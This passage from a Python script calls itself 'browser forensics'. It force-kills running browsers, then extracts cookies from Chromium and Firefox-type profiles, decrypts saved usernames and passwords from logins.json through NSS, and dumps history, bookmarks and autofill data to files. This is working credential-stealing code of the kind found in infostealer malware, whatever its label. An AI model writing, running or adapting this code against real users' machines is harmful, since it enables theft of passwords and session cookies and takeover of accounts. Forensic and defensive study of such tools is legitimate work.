                        f.write("# Netscape HTTP Cookie File
")
                        f.write("# domain	flag	path	secure	expiration	name	value
")
                        for host, name, path, expires, secure, httponly, value in cookies:
                            flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                            secure_str = "TRUE" if bool(secure) else "FALSE"
                            path_str = path if path else "/"
                            line = f"{host}	{flag}	{path_str}	{secure_str}	{expires}	{name}	{value}
"
                            f.write(line)
                    con.close()
            except Exception as e:
                logger.error(f"Error processing cookies: {e}")
        
        # Process Passwords (logins.json)
        if logins_json.exists():
            try:
                logger.debug(f"Processing logins from {logins_json}")
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                if "logins" in data:
                    success_count = 0
                    with open(password_file, "w", encoding="utf-8") as f:
                        f.write("# Passwords
")
                        for login in data["logins"]:
                            hostname = login.get("hostname", "")
                            encrypted_username = login.get("encryptedUsername")
                            encrypted_password = login.get("encryptedPassword")
                            
                            username = nss_handler.decrypt(encrypted_username) if encrypted_username else ""
                            password = nss_handler.decrypt(encrypted_password) if encrypted_password else ""
                            
                            if password: success_count += 1
                            
                            line = f"URL: {hostname}
Username: {username}
Password: {password}

"
                            f.write(line)
                    logger.debug(f"Successfully decrypted {success_count} passwords")
            except Exception as e:
                logger.error(f"Error processing logins: {e}")

        # Process History
        history = extract_gecko_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL	Title	Visit Count	Last Visit
")
                for h in history:
                    f.write(f"{h}
")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Bookmarks
        bookmarks = extract_gecko_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name	URL
")
                for b in bookmarks:
                    f.write(f"{b}
")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process Autofill
        autofills = extract_gecko_autofill(profile_dir)
        if autofills:
            with open(autofill_file, "w", encoding="utf-8") as f:
                for a in autofills:
                    f.write(a)
            logger.debug(f"Extracted {len(autofills)} autofill entries")

        # Shutdown NSS for this profile so we can potentially init another (though NSS often doesn't like re-init)
        nss_handler.shutdown()

def main():
    logger.info("Starting browser forensics script")
    OUTPUT_BASE_DIR.mkdir(parents=True, exist_ok=True)
    # Kill browser processes
    for browser_name, browser_config in BROWSERS.items():
        try:
            logger.debug(f"Attempting to kill {browser_config['process_name']}")
            subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing process: {e}")
    
    # Process Data
    logger.info("Processing browser data")
    processed_paths = set()
    user_profile = os.environ['USERPROFILE']
    for browser_name, browser_config in BROWSERS.items():
        try:
            data_path_rel = browser_config.get('data_path', '')
            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None
            norm = str(data_path).lower() if data_path else ''
            if data_path and data_path.exists():
                if norm in processed_paths:
                    continue
                processed_paths.add(norm)
            if browser_config['type'] == 'chromium':
                process_chromium_browser(browser_name, browser_config)
            elif browser_config['type'] == 'gecko':
                process_gecko_browser(browser_name, browser_config)
        except Exception as e:
            logger.error(f"Error processing {browser_name}: {e}")

    logger.info("Script execution completed")

if __name__ == "__main__":
    if not is_admin():
        logger.warning("Script run without admin privileges. Some features might fail.")
        # sys.exit(1)

    try:
        main()
    except Exception as e:
        logger.critical(f"Unhandled exception in main: {e}")
    finally:
        print("EXECUTION COMPLETE")
